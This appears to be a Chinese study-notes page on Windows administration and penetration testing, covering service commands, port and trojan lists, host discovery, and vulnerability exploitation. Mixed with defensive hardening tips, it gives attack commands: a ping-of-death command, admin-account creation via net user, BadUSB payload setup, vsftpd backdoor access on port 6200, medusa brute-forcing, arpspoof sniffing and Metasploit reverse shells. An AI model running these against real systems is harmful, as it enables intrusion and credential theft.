+<h3 id="windowssystem32driversetchosts"><a class="markdownIt-Anchor" href="#windowssystem32driversetchosts"></a> Windows/system32/drivers/etc/hosts</h3>
+<p>域名解析的功能</p>
+<h2 id="window服务"><a class="markdownIt-Anchor" href="#window服务"></a> Window服务</h2>
+<h3 id="服务的管理"><a class="markdownIt-Anchor" href="#服务的管理"></a> <strong>服务的管理</strong></h3>
+<p>①用命令行管理- -②通过SCM管理</p>
+<h3 id="编写服务程序的语言"><a class="markdownIt-Anchor" href="#编写服务程序的语言"></a> 编写服务程序的语言</h3>
+<p>可以使用c++ 和 c# 编写服务程序</p>
+<h3 id="服务的启动类型"><a class="markdownIt-Anchor" href="#服务的启动类型"></a> 服务的启动类型</h3>
+<p>1，自动</p>
+<p>2，手动</p>
+<p>3，禁止</p>
+<h3 id="三种登录方式"><a class="markdownIt-Anchor" href="#三种登录方式"></a> 三种登录方式</h3>
+<p>Local System（本地系统）</p>
+<p>Network service（网络服务）</p>
+<p>Local Service（本地服务）</p>
+<h3 id="net"><a class="markdownIt-Anchor" href="#net"></a> net</h3>
+<p>–&gt;只能启停止,不能配查。</p>
+<p>net用于打开没有被禁用的服务，语法是：</p>
+<p>net start 服务名一&gt;启动服务</p>
+<p>net stop 服务名一&gt;停止服务</p>
+<h3 id="sc"><a class="markdownIt-Anchor" href="#sc"></a> sc</h3>
+<p>sc query 服务名 -----查询服务 可以不带参数 结果是所有服务信息</p>
+<p>​       sc stop/start 服务名 ----开启/关闭服务</p>
+<p>sc qc 服务名 -----查运行状态</p>
+<p>sc config /？------在注册表和服务数据库中修改服务项</p>
+<p>sc create 服务名 type= 类型 binpath= 路径</p>
+<p>——&gt;创建服务</p>
+<p>sc delete 服务名 —删除服务</p>
+<h3 id="wmic-service-get列出所有服务"><a class="markdownIt-Anchor" href="#wmic-service-get列出所有服务"></a> wmic service get–&gt;列出所有服务</h3>
+<p>脚本检查服务中是否有路径解析漏洞：wmic service get name,displayname,pathname,startmode,startname|findstr /i “Auto” |findstr /i /v “C:\Windows” |findstr /i /v “”&quot;</p>
+<h3 id="findstr"><a class="markdownIt-Anchor" href="#findstr"></a> findstr</h3>
+<p>FINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/F:file][/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]]strings [[drive:][path]filename[ …]]</p>
+<p>参数</p>
+<p>/B 在一行的开始配对模式。</p>
+<p>/E 在一行的结尾配对模式。</p>
+<p>/L 按字使用搜索字符串。</p>
+<p>/R 将搜索字符串作为一般表达式使用。</p>
+<p>/S 在当前目录和所有子目录中搜索匹配文件。</p>
+<p>/I 指定搜索不分大小写。</p>
+<p>/X 打印完全匹配的行。</p>
+<p>/V 只打印不包含匹配的行。</p>
+<p>/N 在匹配的每行前打印行数。</p>
+<p>/M 如果文件含有匹配项，只打印其文件名。</p>
+<p>/O 在每个匹配行前打印字符偏移量。</p>
+<p>/P 忽略有不可打印字符的文件。</p>
+<p>/OFF[LINE] 不跳过带有脱机属性集的文件。</p>
+<p>/A:attr 指定有十六进位数字的颜色属性。请见 “color /?”</p>
+<p>/F:file 从指定文件读文件列表 (/ 代表控制台)。</p>
+<p>/C:string 使用指定字符串作为文字搜索字符串。</p>
+<p>/G:file 从指定的文件获得搜索字符串。 (/ 代表控制台)。</p>
+<p>/D:dir 查找以分号为分隔符的目录列表　strings 要查找的文字。</p>
+<p>[drive:][path]filename　指定要查找的文件。除非参数有 /C 前缀，请使用空格隔开搜索字符串。</p>
+<h2 id="windows端口"><a class="markdownIt-Anchor" href="#windows端口"></a> <strong>Windows</strong>端口</h2>
+<h3 id="http协议代理服务器常用端口号"><a class="markdownIt-Anchor" href="#http协议代理服务器常用端口号"></a> http协议代理服务器常用端口号</h3>
+<p>80/8080/3128/9080/8081</p>
+<h3 id="端口0服务reserved"><a class="markdownIt-Anchor" href="#端口0服务reserved"></a> 端口：0服务：Reserved</h3>
+<p>通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。</p>
+<h3 id="端口1服务tcpmux"><a class="markdownIt-Anchor" href="#端口1服务tcpmux"></a> 端口：1服务：tcpmux</h3>
+<p>这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如：IP、GUEST UUCP、NUUCP、DEMOS、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。</p>
+<h3 id="端口7服务echo"><a class="markdownIt-Anchor" href="#端口7服务echo"></a> 端口：7服务：Echo</h3>
+<p>能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。</p>
+<h3 id="端口19服务character-generator"><a class="markdownIt-Anchor" href="#端口19服务character-generator"></a> 端口：19服务：Character Generator</h3>
+<p>这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。</p>
+<h3 id="端口21服务ftp"><a class="markdownIt-Anchor" href="#端口21服务ftp"></a> 端口：21服务：FTP</h3>
+<p>FTP服务器所开放的端口，用于上传、下载</p>
+<h3 id="端口22服务ssh"><a class="markdownIt-Anchor" href="#端口22服务ssh"></a> 端口：22服务：ssh</h3>
+<p>PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。</p>
+<h3 id="端口23服务telnet"><a class="markdownIt-Anchor" href="#端口23服务telnet"></a> 端口：23服务：Telnet</h3>
+<p>Telnet远程登录</p>
+<h3 id="其他端口"><a class="markdownIt-Anchor" href="#其他端口"></a> 其他端口</h3>
+<h3 id="端口25服务smtp"><a class="markdownIt-Anchor" href="#端口25服务smtp"></a> 端口：25服务：SMTP</h3>
+<p>说明：SMTP服务器所开放的端口，用于发送邮件。</p>
+<p>端口：31服务：MSG Authentication说明：木马Master Paradise、Hackers Paradise开放此端口。</p>
+<p>端口：42服务：WINS Replication说明：WINS复制</p>
+<p>端口：53服务：Domain Name Server（DNS）说明：DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。</p>
+<p>端口：67服务：Bootstrap Protocol Server说明：通过DSL和Cable modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68端口广播请求配置，服务器向67端口广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。</p>
+<h3 id="端口69服务trival-file-transfer"><a class="markdownIt-Anchor" href="#端口69服务trival-file-transfer"></a> 端口：69服务：Trival File Transfer</h3>
+<p>说明：许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何文件。它们也可用于系统写入文件。</p>
+<p>端口：79服务：Finger Server说明：入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。</p>
+<p>端口：80服务：HTTP说明：用于网页浏览。木马Executor开放此端口。</p>
+<p>端口：99服务：Metagram Relay说明：后门程序ncx99开放此端口。</p>
+<p>端口：102服务：Message transfer agent(MTA)-X.400 over TCP/IP说明：消息传输代理。</p>
+<p>端口：109服务：Post Office Protocol -Version3说明：POP3服务器开放此端口，用于接收邮件，客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。</p>
+<p>端口：110服务：SUN公司的RPC服务所有端口说明：常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等</p>
+<p>端口：113服务：Authentication Service说明：这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多计算机的信息。但是它可作为许多服务的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，将会看到许多这个端口的连接请求。记住，如果阻断这个端口客户端会感觉到在防火墙另一边与E-MAIL服务器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。</p>
+<p>端口：119服务：Network News Transfer Protocol说明：NEWS新闻组传输协议，承载USENET通信。这个端口的连接通常是人们在寻找USENET服务器。多数ISP限制，只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送SPAM。</p>
+<p>端口：135服务：Location Service说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个端口。</p>
+<p>端口：137、138、139服务：NETBIOS Name Service说明：其中137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。</p>
+<p>端口：143服务：Interim Mail Access Protocol v2说明：和POP3的安全问题一样，许多IMAP服务器存在有缓冲区溢出漏洞。记住：一种LINUX蠕虫（admv0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一端口还被用于IMAP2，但并不流行。</p>
+<p>端口：161服务：SNMP说明：SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p>
+<p>端口：177服务：X Display Manager Control Protocol说明：许多入侵者通过它访问X-windows操作台，它同时需要打开6000端口。</p>
+<p>端口：389服务：LDAP、ILS说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</p>
+<p>端口：443服务：Https说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。</p>
+<p>端口：445 服务：Windows默认配置下，启动的共享服务，众多木马常用端口。</p>
+<p>端口：456服务：[NULL]说明：木马HACKERS PARADISE开放此端口。</p>
+<p>端口：513服务：Login,remote login说明：是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。</p>
+<p>端口：544服务：[NULL]说明：kerberos kshell</p>
+<p>端口：548服务：Macintosh,File Services(AFP/IP)说明：Macintosh,文件服务。</p>
+<p>端口：553服务：CORBA IIOP（UDP）说明：使用cable modem、DSL或VLAN将会看到这个端口的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。</p>
+<p>端口：555服务：DSF说明：木马PhAse1.0、Stealth Spy、IniKiller开放此端口。</p>
+<p>端口：568服务：Membership DPA说明：成员资格DPA。</p>
+<p>端口：569服务：Membership MSN说明：成员资格MSN。</p>
+<p>端口：635服务：mountd说明：Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个端口的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住mountd可运行于任何端口（到底是哪个端口，需要在端口111做portmap查询），只是Linux默认端口是635，就像NFS通常运行于2049端口。</p>
+<p>端口：636服务：LDAP说明：SSL（Secure Sockets layer）</p>
+<p>端口：666服务：Doom Id Software说明：木马Attack FTP、Satanz Backdoor开放此端口</p>
+<p>端口：993服务：IMAP说明：SSL（Secure Sockets layer）</p>
+<p>端口：1001、1011服务：[NULL]说明：木马Silencer、WebEx开放1001端口。木马Doly Trojan开放1011端口。</p>
+<p>端口：1024服务：Reserved说明：它是动态端口的开始，许多程序并不在乎用哪个端口连接网络，它们请求系统为它们分配下一个闲置端口。基于这一点分配从端口1024开始。这就是说第一个向系统发出请求的会分配到1024端口。你可以重启机器，打开Telnet，再打开一个窗口运行natstat -a将会看到Telnet被分配1024端口。还有SQL session也用此端口和5000端口。</p>
+<p>端口：1025、1033服务：1025：network blackjack 1033：[NULL]说明：木马netspy开放这2个端口。</p>
+<p>端口：1080服务：SOCKS说明：这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。</p>
+<p>端口：1170服务：[NULL]说明：木马Streaming Audio Trojan、Psyber Stream Server、Voice开放此端口。</p>
+<p>端口：1234、1243、6711、6776服务：[NULL]说明：木马SubSeven2.0、Ultors Trojan开放1234、6776端口。木马SubSeven1.0/1.9开放1243、6711、6776端口。</p>
+<p>端口：1245服务：[NULL]说明：木马Vodoo开放此端口。</p>
+<p>端口：1433服务：SQL说明：Microsoft的SQL服务开放的端口。</p>
+<p>端口：1492服务：stone-design-1说明：木马FTP99CMP开放此端口。</p>
+<p>端口：1500服务：RPC client fixed port session queries说明：RPC客户固定端口会话查询</p>
+<p>端口：1503服务：NetMeeting T.120说明：NetMeeting T.120</p>
+<p>端口：1524服务：ingress说明：许多攻击脚本将安装一个后门SHELL于这个端口，尤其是针对SUN系统中Sendmail和RPC服务漏洞的脚本。如果刚安装了防火墙就看到在这个端口上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个端口，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。</p>
+<h2 id="windows常用注册表"><a class="markdownIt-Anchor" href="#windows常用注册表"></a> Windows常用注册表</h2>
+<p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200119104643340.png" alt="image-20200119104643340" /></p>
+<h2 id="常用dos命令"><a class="markdownIt-Anchor" href="#常用dos命令"></a> 常用Dos命令</h2>
+<p>color 改变cmd颜色</p>
+<p>ping -t -l 65550 ip  死亡ping（发送大于64k的文件并一直ping就成了死亡之ping）</p>
+<p>ipconfig 查看ip</p>
+<p>ipconfig /release 释放ip</p>
+<p>ipconfig /renew 重新获取ip</p>
+<p>systeminfo 查看系统信息</p>
+<p>arp -a</p>
+<p>net view 查看局域网内其他计算机名称</p>
+<p>shutdown -s -t 180 -c “字符串”</p>
+<p>shutdown -a 取消 -s 关机 -r 重启</p>
+<p>start <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>  打开网页</p>
+<p>start 123.txt 打开123.txt(使用记事本打开)</p>
+<p>type 123.txt（类似cat）读取文件信息</p>
+<p>copy con c:\123.txt 创建 123.txt</p>
+<p>copy b.jpg/b+b.txt/a c.jpg 图片后追加文本</p>
+<p>ctrl + z 回车</p>
+<p>md 目录名 创建目录</p>
+<p>rd 目录名 删除文件夹</p>
+<p>ren 原文件名 新文件名 重命名</p>
+<p>del  删除文件</p>
+<p>net use g:  \\192.168.100.202\c$ 将远程主机（192.168.100.202）的c盘映射到本机的g盘（此盘的盘符不能与本地磁盘的盘符重复）</p>
+<p>net start  查看开启哪些服务</p>
+<p>net start 服务名  开启服务</p>
+<p>net stop 服务名 停止某服务</p>
+<p>net user 用户名 密码 /add  建立用户</p>
+<p>net user 用户名 密码 在没有/add 的情况下是直接修改密码的（有可能无法执行）</p>
+<p>net user guest  /active:yes 激活guest用户</p>
+<p>net user 查看有哪些用户</p>
+<p>net localGroup Administrators  用户名 /add 把“用户”添加到管理员中使其具有管理员权限 注意事项：administrator 后加s 用复数形式</p>
+<p>net user guest 123 用guest 登录后 将密码改为 123</p>
+<p>net share 查看本地开启的共享</p>
+<p>net share ipc$ 开启ipc共享</p>
+<p>net share ipc$ /del 删除ipc共享</p>
+<p>net share c$ /del 删除c共享</p>
+<p>netstat -a 查看开启了哪些端口 常用搭配为netstat -an</p>
+<p>netstat -n 查看端口的网络连接情况，常用netstat -an</p>
+<p>netstat -v 查看正在进行的工作</p>
+<p>at id号 开启已注册的某个计划任务</p>
+<p>at /delete 停止所有计划任务，使用参数/yes则不需要确认就直接停止</p>
+<p>at ID号 /delete 停止某个已注册的计划任务</p>
+<p>at 查看所有计划任务</p>
+<p>attrib 文件名（目录名） 查看某文件（目录）的属性</p>
+<p>attrib 文件名 -A -R -S -H 或者 +A +R +S +H去掉（添加）某文件的存档，只读，系统 ，隐藏属性</p>
+<h2 id="windows操作系统快捷键"><a class="markdownIt-Anchor" href="#windows操作系统快捷键"></a> windows操作系统快捷键</h2>
+<p>F1 显示当前程序或者windows的帮助内容。</p>
+<p>F2 当你选中一个文件，则表示重命名</p>
+<p>ALT +F4 关闭当前应用程序中的当前文本（记事本 、word）</p>
+<p>F5 刷新</p>
+<p>CTRL + F5 强制刷新</p>
+<p>CTRL + F6 切换到当前应用程序的下一个文本 （加 shift 可以跳转到前一个窗口）</p>
+<p>F10 或者ALT 激活当前程序的菜单栏</p>
+<p>windows键 或 Ctrl+ ESC 打开开始菜单</p>
+<p>Ctrl+ alt	+delete 在 win9x中打开关闭程序对话框</p>
+<p>delete  文件放入回收站</p>
+<p>shift + delete 直接删除不放入回收站</p>
+<p>Ctrl+ shift+ ESC 打开任务管理器</p>
+<p>Ctrl + n 新建一个新的文件</p>
+<p>Ctrl + O 打开“打开文件”对话框</p>
+<p>Ctrl + P 打开“打印”对话框</p>
+<p>Ctrl + s 保存当前操作</p>
+<p>Ctrl+ y 重做</p>
+<p>win+ m 最小化所有被打开窗口</p>
+<p>Ctrl + f 查找</p>
+<h2 id="windows登录密码破解"><a class="markdownIt-Anchor" href="#windows登录密码破解"></a> Windows登录密码破解</h2>
+<h3 id="u盘破解"><a class="markdownIt-Anchor" href="#u盘破解"></a> u盘破解</h3>
+<p>u盘装载pe，使用pe破解</p>
+<h3 id="使用工具破解"><a class="markdownIt-Anchor" href="#使用工具破解"></a> 使用工具破解</h3>
+<h4 id="lc5"><a class="markdownIt-Anchor" href="#lc5"></a> lc5</h4>
+<p>本质上是暴力破解，找hash值</p>
+<h4 id="彩虹表"><a class="markdownIt-Anchor" href="#彩虹表"></a> 彩虹表</h4>
+<h2 id="木马查找"><a class="markdownIt-Anchor" href="#木马查找"></a> 木马查找</h2>
+<p>通过MSConfig 和注册表regedit 查找</p>
+<h1 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h1>
+<p>/proc/cpuinfo</p>
+<p>/proc/meminfo</p>
+<p>du -sh 文件目录 显示文件夹大小</p>
+<h1 id="dns服务器"><a class="markdownIt-Anchor" href="#dns服务器"></a> DNS服务器</h1>
+<p>服务器判定顺序： 	本地缓存-&gt; 本地数据 -&gt;转发器</p>
+<p>dns 查询同一个服务器可以通过不同的域名访问</p>
+<p>攻击方式：dns 缓存中毒 、dns 劫持 、dns ddos</p>
+<h1 id="badusb"><a class="markdownIt-Anchor" href="#badusb"></a> BADUSB</h1>
+<p>使用工具生成服务端程序：</p>
+<p>填写好信息rec地址和端口号</p>
+<p>安装名称：最好为系统软件名称</p>
+<p>按照自己需要勾选对应的选项</p>
+<p>以上工具实现 ，可以自己写一个，也可以找工具生成一个</p>
+<p>接受信息的服务器将入站规则修改为允许该端口号入站即可</p>
+<p>使用软件：arduino 写入程序</p>
+<h1 id="虚拟机"><a class="markdownIt-Anchor" href="#虚拟机"></a> 虚拟机</h1>
+<p>vmware虚拟机解决桥接没有网络的问题：登录虚拟机后，进入编辑，找虚拟网络编辑器，打开高级选项，把自动获取网卡的换成指定的有网络的网卡</p>
+<p>vmware 虚拟网络编辑器可以修改网卡网络问题</p>
+<p>VMware添加新网络本质上就是添加新网卡；修改/etc/network/interfaces 的内容 添加网卡信息例：auto eth2</p>
+<p>iface eth2 inet dhcp//动态获取ip；之后再添加一个网络适配器</p>
+<h2 id="ssh"><a class="markdownIt-Anchor" href="#ssh"></a> ssh</h2>
+<p>kali 默认是不允许使用root登录ssh的，所以要修改/etc/ssh/ssh_config的内容，改为允许root登录:</p>
+<p>permitrootlogin yes</p>
+<p>passwordAuthentication yes</p>
+<h1 id="主机探测"><a class="markdownIt-Anchor" href="#主机探测"></a> 主机探测</h1>
+<p>osi七层模型：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层</p>
+<p>tcp/ip模型：物理层、数据链路层、网络层、传输层、应用层</p>
+<h2 id="二层发现数据链路层"><a class="markdownIt-Anchor" href="#二层发现数据链路层"></a> 二层发现（数据链路层）</h2>
+<h3 id="arping"><a class="markdownIt-Anchor" href="#arping"></a> arping</h3>
+<p>工具可以进行对应的二层主机发现。缺点：无法多个主机同时扫描。</p>
+<h3 id="netdiscover"><a class="markdownIt-Anchor" href="#netdiscover"></a> netdiscover</h3>
+<p>工具可以针对特定子网进行多主机扫描</p>
+<p>-r range -r 192.168.1.0/24  扫描一定范围</p>
+<p>-c count</p>
+<p>-i  device</p>
+<h2 id="三层发现网络层"><a class="markdownIt-Anchor" href="#三层发现网络层"></a> 三层发现（网络层）</h2>
+<p>使用tcp/ip的网络层的协议进行主机发现。一般使用ICMP协议。</p>
+<p>优点：可以发现远程主机，经过路由的主机；速度相对较快。</p>
+<p>缺点：经常被防火墙过滤；速度相比二层发现慢</p>
+<h3 id="ping"><a class="markdownIt-Anchor" href="#ping"></a> ping</h3>
+<p>Linux ping 不指定-c参数 就会一直发送</p>
+<p>Windows ping默认发送四次</p>
+<h3 id="fping"><a class="markdownIt-Anchor" href="#fping"></a> fping</h3>
+<p>针对多个主机进行主机发现</p>
+<p>-g  192.168.1.1/24  对子网段进行主机发现</p>
+<h3 id="hping3"><a class="markdownIt-Anchor" href="#hping3"></a> hping3</h3>
+<p>发送自定义数据包</p>
+<p>-c count  --icmp 也可以使用tcp udp  的选项（使用tcp udp就是四层发现）</p>
+<h2 id="四层发现传输层"><a class="markdownIt-Anchor" href="#四层发现传输层"></a> 四层发现（传输层）</h2>
+<p>优点：可以探测远程主机；比三层发现更可靠</p>
+<p>缺点：时间长</p>
+<h3 id="nmap"><a class="markdownIt-Anchor" href="#nmap"></a> nmap</h3>
+<p>详细见其他</p>
+<h3 id="hping3-2"><a class="markdownIt-Anchor" href="#hping3-2"></a> hping3</h3>
+<p>hping3 -c count  --tcp(udp) ip地址</p>
+<h1 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h1>
+<p>端口对应的服务信息 是端口扫描所要得到的信息</p>
+<p>端口范围：0~65535</p>
+<p>周知：0-1023</p>
+<p>注册：1024-49151</p>
+<p>动态：49152-65535</p>
+<h2 id="nmap-2"><a class="markdownIt-Anchor" href="#nmap-2"></a> nmap</h2>
+<p>nmap -p 22(Range) 192.168.1.2 --script banner 获取banner信息（获取在该端口上的服务信息）</p>
+<p>nmap -p 0-1023  -sV 192.168.1.1/24 获取目标系统端口服务版本信息（不指定-p参数 就是默认扫描所有端口）</p>
+<p>nmap -O 192.168.1.18 检测操作系统版本信息</p>
+<p>有授权情况下使用：nmap -A -v ipAdress 利用nmap对目标进行完整测试</p>
+<h2 id="dmitry"><a class="markdownIt-Anchor" href="#dmitry"></a> dmitry</h2>
+<p>-p 进行tcp端口扫描 -b 返回banner信息</p>
+<p>dmitry -pb ipAddress(Range)</p>
+<h2 id="netcat"><a class="markdownIt-Anchor" href="#netcat"></a> netcat</h2>
+<p>nc(netcat) -nvz ipAddress 	portRange</p>
+<p>nc -nv  ip portRange 返回banner信息</p>
+<h1 id="漏洞扫描"><a class="markdownIt-Anchor" href="#漏洞扫描"></a> 漏洞扫描</h1>
+<p>原理：漏洞扫描器对漏洞进行扫描，以验证具体目标是否存在对应具体漏洞，存在错误扫描。需要进行漏洞验证。</p>
+<p>发送对应验证数据到目标下，根据返回结果判断是否有漏洞存在</p>
+<h2 id="nmap-3"><a class="markdownIt-Anchor" href="#nmap-3"></a> nmap</h2>
+<p>nmap --script vuln ipAdress</p>
+<h2 id="nessus"><a class="markdownIt-Anchor" href="#nessus"></a> nessus</h2>
+<h2 id="metasploit-漏洞利用"><a class="markdownIt-Anchor" href="#metasploit-漏洞利用"></a> metasploit 漏洞利用</h2>
+<p>msfconsole 启动msf</p>
+<p>search xxx（要查找的信息）</p>
+<p>searchsploit xxx 也可以做到同样的事</p>
+<p>use exploit/xxxx/xxx/xxx（模块名字）</p>
+<p>show payloads 显示payloads的信息</p>
+<p>set payload  payload的名字</p>
+<p>show option 显示payload选项</p>
+<p>按照选项完成设置</p>
+<p>exploit 启动利用</p>
+<h2 id="web漏洞扫描"><a class="markdownIt-Anchor" href="#web漏洞扫描"></a> web漏洞扫描</h2>
+<p>常用工具：AWVS、appscan、Nikto、Burpsuite、Owasp-Zap</p>
+<h3 id="nikto"><a class="markdownIt-Anchor" href="#nikto"></a> nikto</h3>
+<p>nikto -host  ipAdress</p>
+<p>nikto 主要针对web应用</p>
+<h3 id="sqlmap"><a class="markdownIt-Anchor" href="#sqlmap"></a> sqlmap</h3>
+<p>神器：可以扫web并且漏洞利用</p>
+<p>获取数据库的表名、列名、数据</p>
+<h2 id="web神器"><a class="markdownIt-Anchor" href="#web神器"></a> web神器</h2>
+<h3 id="burpsuite"><a class="markdownIt-Anchor" href="#burpsuite"></a> burpsuite</h3>
+<h4 id="证书安装"><a class="markdownIt-Anchor" href="#证书安装"></a> 证书安装</h4>
+<p>打开burp和浏览器将代理打开，访问http://burp ,将证书下载，然后将证书导入浏览器。</p>
+<h4 id="截断设置"><a class="markdownIt-Anchor" href="#截断设置"></a> 截断设置</h4>
+<p>Proxy——&gt;Options-&gt;intercept client requests</p>
+<p>intercept server response</p>
+<p>设置截断Websocket通信以及修改Response的内容</p>
+<p>Proxy——&gt;Options-&gt;Intercept WebSockets Messages</p>
+<p>response modification 可以设置remove all javaScript 移除绕过文件上传中的JS验证</p>
+<p>SSL Pass Through 使用ssl连接到web服务器</p>
+<p>Miscellaneous 杂项设置</p>
+<h1 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h1>
+<h2 id="ftp"><a class="markdownIt-Anchor" href="#ftp"></a> ftp</h2>
+<p>服务器anonymous的用户不关闭可能会造成匿名漏洞的出现（默认开启）</p>
+<p>匿名漏洞利用：可以直接使用nc 连接ftp</p>
+<p>nc 15.1.2.12 21</p>
+<p>nmap --script vuln 192.168.15.3 -p 21</p>
+<p>ftp后门漏洞：vsftpd 2.3.4就有后门漏洞</p>
+<p>如果用户名user中包含:)那么就直接触发监听6200端口的连接的shell ，权限是root</p>
+<p>可以用nc ip 6200</p>
+<p>解决方法：修改配置文件；</p>
+<p>iptables -A  INPUT -p tcp -dport 6200 -j　DROP</p>
+<p>iptables -A OUTPUT -p tcp -sport 6200 -j DROP</p>
+<p>FTP 用户名密码暴力破解</p>
+<p>medusa 暴力破解 ftp登录</p>
+<p>medusa -h ip -u 用户名 -P 字典 -M ftp (也可以用其他模式)</p>
+<p>FTP 使用明文传输</p>
+<p>所以使用arpspoof 进行arp嗅探</p>
+<p>arpspoof -i 网卡 网关ipAdress -t 重定向到的ip地址</p>
+<p>进而可以抓包分析</p>
+<p>登录之后可以使用metasploit 创建反弹shell 上传到ftp服务器</p>
+<p>使用setoolkit</p>
+<p>选择create a payload and listener</p>
+<p>然后选择合适的选项 根据提示进行选择</p>
+<h2 id="ssh-2"><a class="markdownIt-Anchor" href="#ssh-2"></a> SSH</h2>
+<p>apt-get install openssh-server</p>
+<p>ubuntu 搭建ssh客户端：apt-get install putty-tools</p>
+<p>获取 ssh Banner信息 msf方式：</p>
+<p>use auxiliary/scanner/ssh/ssh_version</p>
+<p>show option</p>
+<p>set rhost IP</p>
+<p>set rport 22</p>
+<p>exploit</p>
+<p>nc ip 22</p>
+<p>规避方式： 在sshd_config 加一行DebianBanner no</p>
+<p>ssh 暴力破解：	medusa -h ip -U 用户名字典 -P 密码字典 -M ssh</p>
+<p>命令行登录： ssh 用户名@ip地址</p>
+<p>metasploit 利用ssh登录反弹shell</p>
+<p>参考metasploit漏洞利用那一节</p>
+<p>use auxiliary/scanner/ssh/ssh_login</p>
+<p>show options</p>
+<p>…</p>
+<p>run之后</p>
+<p>session -l 查看当前session详细信息</p>
+<p>之后根据具体情况使用</p>
+<p>ssh 安全防护：修改该默认端口 /etc/ssh/sshd_config 修改port ；</p>
+<p>ssh 设置PGP登录 即使用密钥对进行身份验证 生成ssh密钥对，使用puttygen</p>
+<p>ssh-keygen 命令 在linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys ，复制私钥文件到.ssh目录下。使用 puttygen -L “拷贝私钥文件”，将内容复制到authorized_keys文件中。</p>
+<p>ssh 防止暴力破解 ：只采用ssh pgp方式验证登录</p>
+<p>修改/etc/ssh/sshd_config 的PasswordAuthentication 为no</p>
+<p>iptables设置阈值防止暴力破解 ：</p>
+<p>iptables -I INPUT -p tcp --dport 22 -i eth0(网卡) -m state --state NEW recent --set</p>
+<p>iptables -I INPUT -p tcp --dport 22 -i 网卡 -m state --state NEW recent --update --seconds 120 --hitcount 3 -j DROP</p>
+<h2 id="telnet"><a class="markdownIt-Anchor" href="#telnet"></a> telnet</h2>
+<p>默认使用23端口 明文传输</p>
+<p>nmap -sV  ip</p>
+<p>msfconsle 漏洞利用</p>
+<p>参考msf漏洞利用的方式</p>
+<p>session -l  会话详细信息</p>
+<p>session -i id 使用对应会话</p>
+<p>提权 exploit-db下载</p>
